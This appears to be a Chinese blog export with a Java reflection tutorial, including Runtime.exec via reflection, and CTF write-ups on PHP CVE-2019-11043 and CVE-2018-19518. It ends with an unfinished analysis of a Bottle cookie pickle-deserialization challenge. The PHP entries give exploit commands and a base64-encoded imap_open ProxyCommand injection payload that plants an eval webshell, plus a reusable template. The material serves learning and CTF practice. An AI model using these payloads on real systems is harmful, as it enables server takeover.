<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180216-5bf1f938-17f6-1.png" alt="img"></p>
<p>所以这时候我们就需要第二种方法了:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class p=Class.*forName*(&quot;test.phone&quot;);</span><br><span class="line"></span><br><span class="line">Constructor constructor=p.getConstructor(String.class,double.class);</span><br><span class="line">//这个是调用了我们之前设置的含参构造器(忘记的上去看看第一部分构造的),后面传入的参数是String和double的原型类，因为我们之前构造器的参数类型就是String和double，所以我们这里用这个。</span><br><span class="line"></span><br><span class="line">Object p1=constructor.newInstance(&quot;8848&quot;,114514); </span><br><span class="line">//这里在实例化的时候就可以直接对name属性和weight属性赋值了</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180259-75b274ce-17f6-1.png" alt="img"></p>
<h3 id="③-获取类的构造器constructor">③.获取类的构造器constructor</h3>
<p>获取类的构造器constructor的四种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1.获取public类型的构造器:getConstructor(class[]parameterTypes)</span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">Constructor constructor=p.getConstructor();</span><br><span class="line">//这里你可以指定参数，来获取含参的构造器，之前演示过，不再赘述.</span><br><span class="line"></span><br><span class="line">//2.获取全部public类型的构造器:getConstructors()</span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">Constructor[] constructor=p.getConstructors();</span><br><span class="line">//注意这里要用数组，因为全部构造器可能并不只有一个</span><br><span class="line"></span><br><span class="line">//3.获取public和private类型的构造器:getDeclaredConstructor(class[]parameterTypes)</span><br><span class="line">//当我们前面构造器类型是private的时候，运用上述两种方法是调用不到的。</span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">Constructor constructor=p.getDeclaredConstructor();</span><br><span class="line"></span><br><span class="line">//4.获取全部类型的构造器:getDeclaredConstructors()</span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">Constructor[] constructor=p.getDeclaredConstructors();</span><br><span class="line">//注意，这个同意要改为数组的形式</span><br></pre></td></tr></table></figure>
<p>他这里就演示最后一个:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180321-8299b3b4-17f6-1.png" alt="img"></p>
<h3 id="④-获取类的属性field">④.获取类的属性field</h3>
<p>常见获取类属性field的四种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1.获取类的一个public类型属性:getField(String name)</span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">Field f=p.getField(&quot;name&quot;);</span><br><span class="line"></span><br><span class="line">//2.获取类的一个全部类型的属性:getDeclaredField(String name)</span><br><span class="line"> Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line"> Field f=p.getDeclaredField(&quot;weight&quot;);</span><br><span class="line"></span><br><span class="line">//3.获取类的全部public类型的属性:getFields()</span><br><span class="line"> Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line"> Field[] f=p.getFields(); //同样要注意改成数组</span><br><span class="line"></span><br><span class="line">//4.获取类的全部类型的属性:getDeclaredFields()</span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">Field[] f=p.getDeclaredFields(); //同样要注意改成数组</span><br></pre></td></tr></table></figure>
<p>这里同样演示最后一个:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180348-9271adbe-17f6-1.png" alt="img"></p>
<p>可以看到public和private类型的属性都被我们获取了，然后我们就可以对这些属性进行赋值(获取单个指定属性时)等操作。</p>
<h3 id="⑤-获取类的方法method">⑤.获取类的方法method</h3>
<p>常见获取类的方法的四种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1.获取类的一个特定public类型的方法:getMethod(String name,class[] parameterTypes)</span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">Method m=p.getMethod(&quot;setName&quot;, String.class); //要注意这里有两个参数，后面要传入的是方法形参的类型的原型,无参函数就不用填</span><br><span class="line"></span><br><span class="line">//2.获取类的一个特定无论什么类型的方法:getDeclaredMethod(String name,class[] parameterTypes)</span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">Method m=p.getDeclaredMethod(&quot;setName&quot;, String.class);</span><br><span class="line"></span><br><span class="line">//3.获取类的全部public的方法:getMethods()</span><br><span class="line">Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line">Method[] m=p.getMethods();//要注意改成数组</span><br><span class="line"></span><br><span class="line">//4.获取类的全部类型的方法:getDeclaredMethods()</span><br><span class="line"> Class p=Class.forName(&quot;test.phone&quot;);</span><br><span class="line"> Method[] m=p.getDeclaredMethods(); //同样要注意改成数组</span><br></pre></td></tr></table></figure>
<p>这里就演示最后一个:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180412-a1429e3e-17f6-1.png" alt="img"></p>
<p>反射的基本要素我们学完了，下面以之前的phone类为例子，完整的演示一遍:</p>
<h3 id="反射完整使用演示">反射完整使用演示</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class p=Class.*forName*(&quot;test.phone&quot;);           //获取phone类的原型</span><br><span class="line">Constructor constructor=p.getConstructor();      //获取无参的构造器</span><br><span class="line">Object o=constructor.newInstance();             //实例化一个对象o</span><br><span class="line">Method m=p.getMethod(&quot;dianyuan&quot;);               //获取方法dianyuan</span><br><span class="line">m.invoke(o);                                    //运用Method的invoke方法来执行这个类的方法</span><br><span class="line">Method m1=p.getMethod(&quot;setName&quot;, String.class); //获取方法setName</span><br><span class="line">Method m2=p.getMethod(&quot;getName&quot;);               //获取方法getName</span><br><span class="line">m1.invoke(o,&quot;8848&quot;);                            //执行setName方法，为Name属性赋值</span><br><span class="line">System.*out*.println(m2.invoke(o));             //调用getName的方法并打印返回值</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180544-d7fc3714-17f6-1.png" alt="img"></p>
<p>不仅仅只有这些模式来反射属性和方法，但每个成分对应的反射机制就是上面介绍的那些，可以根据需求来替换，选择适合自己的方式。补充:当调用的方法，属性，构造器是私有的时候，那么我们不仅仅在获取时要用特殊的方法，在获取后的调用中还要调用setAccessible方法来修改作用域，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//假设我把setName设置为私有的方法</span><br><span class="line"></span><br><span class="line">Class p=Class.*forName*(&quot;test.phone&quot;);           //获取phone类的原型</span><br><span class="line">Constructor constructor=p.getConstructor();      //获取无参的构造器</span><br><span class="line">Object o=constructor.newInstance();             //实例化一个对象o</span><br><span class="line">Method m=p.getMethod(&quot;dianyuan&quot;);               //获取方法dianyuan</span><br><span class="line">m.invoke(o);                                    //运用Method的invoke方法来执行这个类的方法</span><br><span class="line">Method m1=p.getDeclaredMethod(&quot;setName&quot;, String.class);//运用getDeclaredMethod获取私有方法setName</span><br><span class="line"> m1.setAccessible(true);                       </span><br><span class="line">//调用setAccessible方法来允许我们操作私有方法(私有属性和私有构造器同样如此)</span><br><span class="line">Method m2=p.getMethod(&quot;getName&quot;);               //获取方法getName</span><br><span class="line">m1.invoke(o,&quot;8848&quot;);                            //执行setName方法，为Name属性赋值</span><br><span class="line">System.*out*.println(m2.invoke(o));             //调用getName的方法并打印返回值</span><br></pre></td></tr></table></figure>
<p>未使用前:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180606-e4a9bdec-17f6-1.png" alt="img"></p>
<p>使用后:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180622-ee67754a-17f6-1.png" alt="img"></p>
<h3 id="Runtime类的演示">Runtime类的演示</h3>
<p><strong>Runtime类中有个exec方法可以进行命令执行，下面演示一下如何通过反射来调用:</strong></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180644-fb878ab2-17f6-1.png" alt="img"></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180659-046e7406-17f7-1.png" alt="img"><br>
查阅官方的Runtime.java文档，可以看到里面有个私有的无参构造器和exec方法下进行了命令执行，那么我们的目标就很明确:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class p=Class.*forName*(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor constructor=p.getDeclaredConstructor(); //调用私有构造器</span><br><span class="line">constructor.setAccessible(true); //修改作用域</span><br><span class="line">Method m=p.getMethod(&quot;exec&quot;, String.class); //获取exec方法</span><br><span class="line">Object o=constructor.newInstance(); //实例化对象</span><br><span class="line">m.invoke(o,&quot;calc&quot;); //调用exec方法，执行calc命令</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230701180724-1376c836-17f7-1.png" alt="img"></p>
]]></content>
      <tags>
        <tag>Java反射</tag>
      </tags>
  </entry>
  <entry>
    <title>phpCVE</title>
    <url>/2025/03/05/phpCVE/</url>
    <content><![CDATA[<h1>web311</h1>
<p>不知道是什么东西，跟着wp做就莫名其妙拿到shell了</p>
<p>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的<a href="https://cloud.tencent.com/product/cvm/?from_column=20065&amp;from=20065">服务器</a>存在漏洞，可允许攻击者远程执行代码。</p>
<p>向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常。</p>
<p>该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">location ~ [^<span class="regexp">/]\.php(/</span>|$) &#123;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> fastcgi_split_path_info ^(.+?\.<span class="property">php</span>)(/.*)$;</span><br><span class="line"></span><br><span class="line"> fastcgi_param <span class="variable constant_">PATH_INFO</span> $fastcgi_path_info;</span><br><span class="line"></span><br><span class="line"> fastcgi_pass   <span class="attr">php</span>:<span class="number">9000</span>;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。</p>
<p><strong>影响范围</strong></p>
<p>在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：</p>
<ul>
<li>PHP 7.0 版本</li>
<li>PHP 7.1 版本</li>
<li>PHP 7.2 版本</li>
<li>PHP 7.3 版本</li>
</ul>
<p>做题我们要使用的工具是phuip-fpizdam，基于Go语言的。</p>
<p>先在虚拟机上配置好语言环境和工具。（root）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//更新一下apt</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install --fix-missing</span><br><span class="line">apt --fix-broken install -y</span><br><span class="line"></span><br><span class="line">//安装go</span><br><span class="line">apt install golang</span><br><span class="line"></span><br><span class="line">//测试是否成功</span><br><span class="line">go -version</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//下载工具源码，下不了的话科学上网开全局</span><br><span class="line">git clone https://github.com/neex/phuip-fpizdam.git</span><br><span class="line"></span><br><span class="line">//查看go环境信息</span><br><span class="line">go env</span><br><span class="line"></span><br><span class="line">//目录跳转</span><br><span class="line">cd phuip-fpizdam</span><br><span class="line"></span><br><span class="line">//安装所需</span><br><span class="line">go get -v &amp;&amp; go build</span><br><span class="line"></span><br><span class="line">//如果上条安装所需没反应或者报错，就先执行下面这题（切换代理），然后再安装所需</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Google当中先看看network</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server:nginx/1.18.0 (Ubuntu)</span><br><span class="line"></span><br><span class="line">X-Powered-By:PHP/7.1.33dev</span><br></pre></td></tr></table></figure>
<p>是<code>CVE-2019-11043</code>的特征，并且版本也满足。我们选择用工具一把梭。</p>
<p>工具文件夹里面开终端，换成root，执行：（URL后面要加一个<code>/index.php</code>）</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> run . <span class="string">&quot;https://205bc045-a30a-43e0-8e4a-f50661152144.challenge.ctf.show/index.php&quot;</span></span><br></pre></td></tr></table></figure>
<p>执行过程有一点慢</p>
<p>之后可以直接拿到shell</p>
<p>/index.php?a=ls</p>
<p>/index.php?a=cat fl0gHe1e.txt</p>
<p>此漏洞与二进制相关：</p>
<p><a href="https://xz.aliyun.com/news/6275">https://xz.aliyun.com/news/6275</a></p>
<p><a href="https://xz.aliyun.com/news/6276">https://xz.aliyun.com/news/6276</a></p>
<h1>web312</h1>
<p>CVE-2018-19518</p>
<p>漏洞介绍</p>
<p>IMAP协议（因特网消息访问协议）它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。它运行在TCP/IP协议之上，使用的端口是143。在php中调用的是imap_open函数。</p>
<p>PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit Framework的一部分。</p>
<p>imap_open(string $mailbox,string $user,string $password)</p>
<p>其中参数mailbox,是用来连接邮箱服务器的。它会调用rsh来连接远程shell而，debian/ubuntu中默认使用ssh来代替rsh，如下图：</p>
<p><img src="/2025/03/05/phpCVE/image-20250305205348530.png" alt="image-20250305205348530"></p>
<p>又因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，所以攻击者通过注入这个参数，最终将导致命令执行漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -oProxyCommand =&quot;tac /flag|tee /tmp/executed&quot;localhost</span><br><span class="line">#其中管道符tee意思是将内容追加到文件并且在屏幕输出</span><br></pre></td></tr></table></figure>
<p>ProxyCommand，连接服务器的这样的一个命令具体说明如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ProxyCommand 指定用于连接服务器的命令。命令字符串扩展到行的末尾，并使用用户的shell’ exec’指令执行，以避免延迟的shell进程。 ProxyCommand接受TOKENS 部分中描述的令牌的参数。该命令基本上可以是任何东西，并且应该从其标准输入读取并写入其标准输出。它应该最终连接在某台机器上运行的sshd服务器，或者在sshd -i某处执行。主机密钥管理将使用所连接主机的HostName完成（默认为用户键入的名称）。设置命令以none完全禁用此选项。请注意， CheckHostIP无法与代理命令连接。 该指令与nc及其代理支持结合使用非常有用。例如，以下指令将通过192.0.2.0的HTTP代理连接： ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p</span><br></pre></td></tr></table></figure>
<p>解析命令时还会有问题。要绕过斜杠和空格的转义。用$IFS和\t或者base64编码和相关命令再解码。如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;echo hello|tee /tmp/executed&quot;|base64</span><br><span class="line"></span><br><span class="line">ehco ZWNobyBoZWxsb3x0ZWUgL3RtcC9leGVjdXRlZAo=|base64 -d|bash</span><br></pre></td></tr></table></figure>
<p>影响版本</p>
<p>Ubuntu、Debian、Red Hat、SUSE</p>
<p>PHP 5.6.x &lt; 5.6.39</p>
<p>开始做题。初始界面是邮箱登录，有三个参数可以输入，分别是邮箱、账号、密码。是CVE-2018-19518的特征。</p>
<p>看看network，版本条件都满足。</p>
<p>抓个包看看，三个参数是hostname、username、password，猜测后端PHP语言用了imap_open(string $mailbox,string $user,string $password)语句。满足条件。</p>
<p>直接固定payload打：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#原始payload</span></span><br><span class="line">x+-oProxyCommand=echo	echo <span class="string">&#x27;&lt;?php eval($_POST[1]);&#x27;</span> &gt; /var/www/html/<span class="number">1.</span>php|base64	-d|sh&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#base64+url编码以后</span></span><br><span class="line">hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#模板</span></span><br><span class="line">hostname=x+-oProxyCommand%3decho%09【要执行命令的base64】|base64%09-d|sh&#125;&amp;username=xxx&amp;password=xxx</span><br><span class="line">最终payload：</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;&amp;username=xxx&amp;password=xxx</span><br></pre></td></tr></table></figure>
<p>访问/1.php，直接getshell post连接为1</p>
]]></content>
      <tags>
        <tag>phpCVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Python魔术方法</title>
    <url>/2025/04/30/Python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>XYctf</title>
    <url>/2025/04/30/XYctf/</url>
    <content><![CDATA[<h2 id="Signin">Signin</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>1.开头注释当中给出了一个flag in /flag_{uuid4},这是一个文件?不确定.</p>
<p>2.打开一个secret.txt文件赋值给变量f,最后通过.read()将内容赋值给变量secret,但是我们并不知道secret.txt的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br></pre></td></tr></table></figure>
<p>3.如果用户以默认路由/进入网页,就返回HI</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>4./download路由,并且通过filename参数进行传参,并且有一个waf:name当中不能有<code>../../</code>和<code>\\</code>	不能以<code>/</code>和<code>../</code>开头	如果其中有,则返回403Forbidden,否则返回文件内容</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<p>5./secret路由,这里具体分析</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br></pre></td></tr></table></figure>
<p>对于新手来说,应该可以看懂上面的所以代码,然而,看完之后就只知道让cookie的session当中的name为admin就可以…可以干什么???<br>
其实问题就在这里,就算我们cookie当中的session中的name为admin,那又怎样呢?返回一个’The secret has been deleted!'就没了?什么 操作都没有?不输出flag之类的???</p>
<p>如果要接着往下做题就需要了解两个python方法,第一个是<code>get_cookie</code>	第二个是<code>set_cookie</code>	在vscode当中ctrl+左键就可以看到其源码.这里有一个前置知识:<a href="https://thebaobao.github.io/2025/04/29/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化</a></p>
<p><strong>get_cookie</strong></p>
<p>get_cookie目的是从 HTTP 请求中获取 cookie 值，并在启用签名验证的情况下对 cookie 的签名进行校验，防止被伪造。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line">        value = <span class="variable language_">self</span>.cookies.get(key)</span><br><span class="line">        <span class="keyword">if</span> secret:</span><br><span class="line">            <span class="keyword">if</span> value <span class="keyword">and</span> value.startswith(<span class="string">&#x27;!&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">                sig, msg = <span class="built_in">map</span>(tob, value[<span class="number">1</span>:].split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>))</span><br><span class="line">                <span class="built_in">hash</span> = hmac.new(tob(secret), msg, digestmod=digestmod).digest()</span><br><span class="line">                <span class="keyword">if</span> _lscmp(sig, base64.b64encode(<span class="built_in">hash</span>)):</span><br><span class="line">                    dst = pickle.loads(base64.b64decode(msg))</span><br><span class="line">                    <span class="keyword">if</span> dst <span class="keyword">and</span> dst[<span class="number">0</span>] == key:</span><br><span class="line">                        <span class="keyword">return</span> dst[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">return</span> default</span><br><span class="line">        <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br></pre></td></tr></table></figure>
<p>定义一个方法 get_cookie，接受参数：</p>
<p>​	key: 要获取的 cookie 名称。</p>
<p>​	default: 如果 cookie 不存在或验证失败，返回的默认值。</p>
<p>​	secret: 如果提供了 secret，则说明需要对 cookie 进行签名验证。</p>
<p>​	digestmod: 指定用于 HMAC 的哈希算法，默认是 hashlib.sha256。</p>
<p>cookie格式**<code>!sig部分?msg部分</code>**</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">self, key, default=<span class="literal">None</span>, secret=<span class="literal">None</span>, digestmod=hashlib.sha256</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    获取并验证加密的cookie值</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        key: 要获取的cookie键名</span></span><br><span class="line"><span class="string">        default: 如果cookie不存在或验证失败时返回的默认值</span></span><br><span class="line"><span class="string">        secret: 用于验证cookie签名的密钥</span></span><br><span class="line"><span class="string">        digestmod: 哈希算法，默认为sha256</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 从cookies字典中获取指定key的值</span></span><br><span class="line">    value = <span class="variable language_">self</span>.cookies.get(key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果提供了secret(密钥)，则需要进行签名验证</span></span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        <span class="comment"># 检查value是否存在，是否以&#x27;!&#x27;开头(标记为已签名)，并且包含&#x27;?&#x27;(分隔符)</span></span><br><span class="line">        <span class="keyword">if</span> value <span class="keyword">and</span> value.startswith(<span class="string">&#x27;!&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> value:</span><br><span class="line">            <span class="comment"># 将cookie值分割成签名部分(sig)和消息部分(msg)</span></span><br><span class="line">            <span class="comment"># value[1:]去掉开头的&#x27;!&#x27;，然后用&#x27;?&#x27;分割成两部分</span></span><br><span class="line">            <span class="comment"># map(tob, ...)确保两部分都是字节类型</span></span><br><span class="line">            sig, msg = <span class="built_in">map</span>(tob, value[<span class="number">1</span>:].split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>))</span><br><span class="line">            	<span class="string">&quot;&quot;&quot;	</span></span><br><span class="line"><span 